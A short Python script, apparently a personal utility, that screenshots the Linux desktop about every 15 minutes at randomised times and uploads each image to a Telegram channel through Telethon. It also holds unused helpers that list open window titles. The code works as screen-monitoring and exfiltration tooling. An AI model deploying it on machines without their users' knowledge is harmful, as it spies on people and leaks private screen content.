import os
import asyncio
import random
import subprocess
from telethon import TelegramClient

# ===== ENV =====
api_id = int(os.getenv("TG_API_ID"))
api_hash = os.getenv("TG_API_HASH")
channel_id = int(os.getenv("TG_CHANNEL_ID"))

BASE_INTERVAL = 15 * 60
RANDOM_SHIFT = 5 * 60
SCREEN_PATH = "/tmp/tg_screen.png"
SESSION = os.environ.get("XDG_SESSION_TYPE", "x11")

client = TelegramClient(
    "/home/user/Files/utils/session",
    api_id,
    api_hash
)
# ---------- SCREENSHOT ----------
def make_screenshot():
    if SESSION == "wayland":
        subprocess.run(
            ["gnome-screenshot", "-f", SCREEN_PATH],
            check=True
        )
    else:
        subprocess.run(
            ["scrot", SCREEN_PATH],
            check=True
        )
    return SCREEN_PATH

# ---------- WINDOWS ----------
def get_windows_x11():
    out = subprocess.check_output(["wmctrl", "-l"], text=True)
    lines = out.strip().splitlines()
    return "\n".join(line.split(None, 3)[-1] for line in lines)

def get_windows_wayland():
    out = subprocess.check_output([
        "gdbus", "call",
        "--session",
        "--dest", "org.gnome.Shell",
        "--object-path", "/org/gnome/Shell",
        "--method", "org.gnome.Shell.Eval",
        "global.get_window_actors().map(w => w.meta_window.get_title()).join('\\n')"
    ], text=True)

    return out.split("'", 2)[1] or "Нет окон"

def get_open_windows():
    return (
        get_windows_wayland()
        if SESSION == "wayland"
        else get_windows_x11()
    )

# ---------- MAIN ----------
async def main():
    await client.start()
    INCRIMINANT = 0

    while True:
        screenshot = make_screenshot()

        caption = f"#{INCRIMINANT}"
        INCRIMINANT += 1
        await client.send_file(
            channel_id,
            screenshot,
            caption=caption
        )

        os.remove(screenshot)

        delay = BASE_INTERVAL + random.randint(-RANDOM_SHIFT, RANDOM_SHIFT)
        print("delay =", delay)
        await asyncio.sleep(delay)

asyncio.run(main())
